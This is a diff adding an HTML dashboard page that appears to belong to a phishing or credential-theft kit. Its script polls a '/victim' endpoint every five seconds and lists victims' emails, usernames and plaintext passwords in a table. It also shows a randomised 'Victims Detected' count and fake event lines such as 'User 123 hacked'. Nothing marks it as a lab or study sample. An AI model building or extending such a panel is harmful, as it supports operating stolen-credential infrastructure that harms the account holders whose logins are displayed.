@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Traffic Overview - BOBA Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Navbar Included Here -->
+    <div id="navbar-container"></div>
+
+    <section>
+        <h1>Traffic Overview</h1>
+        <button id="back-to-dashboard">Back to Dashboard</button>
+    </section>
+
+    <section class="traffic-details-container">
+        <!-- Detailed Traffic Info -->
+        <div class="traffic-card">
+            <h2>Real-time Traffic Details</h2>
+            <p>Users Active: <span id="active-users">0</span></p>
+            <p>Victims Detected: <span id="victim-details">0</span></p>
+            <p>Last Update: <span id="last-update-details">Just Now</span></p>
+        </div>
+
+        <div class="traffic-card">
+            <h2>Recent Traffic Events</h2>
+            <ul id="traffic-events">
+                <!-- Traffic events will appear here dynamically -->
+            </ul>
+        </div>
+
+        <!-- Table to display usernames, emails, passwords, and comments from victims -->
+        <div class="traffic-card">
+            <h2>Victim Details</h2>
+            <table id="victim-details-table">
+                <thead>
+                    <tr>
+                        <th>Email</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Comment</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <!-- Data will be inserted here dynamically -->
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <script>
+        // Back to Dashboard Button Event
+        document.getElementById('back-to-dashboard').addEventListener('click', function() {
+            window.location.href = 'dashboard.html'; 
+        });
+
+        // Simulate traffic data for the example
+        function updateTrafficData() {
+            // Simulate real-time data
+            document.getElementById('active-users').textContent = Math.floor(Math.random() * 1000);
+            document.getElementById('victim-details').textContent = Math.floor(Math.random() * 100);
+            document.getElementById('last-update-details').textContent = new Date().toLocaleTimeString();
+
+            // Simulate traffic events
+            const events = [
+                "User 123 hacked",
+                "User 456 targeted",
+                "User 789 infiltrated",
+                "User 1010 data breached"
+            ];
+            
+            const trafficEventsList = document.getElementById('traffic-events');
+            trafficEventsList.innerHTML = '';
+            events.forEach(event => {
+                const li = document.createElement('li');
+                li.textContent = event;
+                trafficEventsList.appendChild(li);
+            });
+
+            // Fetch the victim data from the server
+            fetch('/victim')  
+                .then(response => response.json())
+                .then(victimData => {
+                    const tableBody = document.getElementById('victim-details-table').getElementsByTagName('tbody')[0];
+                    tableBody.innerHTML = ''; 
+
+                    if (victimData.length === 0) {
+                        const row = document.createElement('tr');
+                        const noDataCell = document.createElement('td');
+                        noDataCell.colSpan = 4;
+                        noDataCell.textContent = "No victim data available.";
+                        row.appendChild(noDataCell);
+                        tableBody.appendChild(row);
+                    }
+
+                    victimData.forEach(entry => {
+                        const row = document.createElement('tr');
+                        const emailCell = document.createElement('td');
+                        const usernameCell = document.createElement('td');
+                        const passwordCell = document.createElement('td');
+                        const commentCell = document.createElement('td');
+
+                        emailCell.textContent = entry.email;
+                        usernameCell.textContent = entry.username;
+                        passwordCell.textContent = entry.password;
+                        commentCell.textContent = entry.comment;
+
+                        row.appendChild(emailCell);
+                        row.appendChild(usernameCell);
+                        row.appendChild(passwordCell);
+                        row.appendChild(commentCell);
+                        tableBody.appendChild(row);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching victim data:', error);
+                    const tableBody = document.getElementById('victim-details-table').getElementsByTagName('tbody')[0];
+                    tableBody.innerHTML = ''; // Clear existing rows
+                    const row = document.createElement('tr');
+                    const errorCell = document.createElement('td');
+                    errorCell.colSpan = 4;
+                    errorCell.textContent = "Error fetching data. Please try again later.";
+                    row.appendChild(errorCell);
+                    tableBody.appendChild(row);
+                });
+        }
+
+        // Update traffic every 5 seconds
+        setInterval(updateTrafficData, 5000);
+
+        // Initialize traffic data on page load
+        updateTrafficData();
+    </script>
+</body>
+</html>
